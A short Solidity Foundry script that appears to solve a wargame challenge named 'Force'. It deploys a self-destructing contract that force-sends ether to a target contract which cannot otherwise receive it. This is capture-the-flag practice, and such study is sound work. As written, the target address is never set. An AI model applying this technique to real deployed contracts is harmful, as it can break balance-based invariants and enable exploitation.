pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Force} from "../src/Force.sol";


contract Suicide
{
    constructor(address victim) payable
    {
        selfdestruct(payable(victim));
    }
}

contract script_Force is Script
{
    address forceAddress; // instance address
    Suicide suicide;

    function run() external
    {
        vm.startBroadcast();

        suicide = new Suicide{value: 0.0000001 ether}(forceAddress);

        vm.stopBroadcast();
    }
}

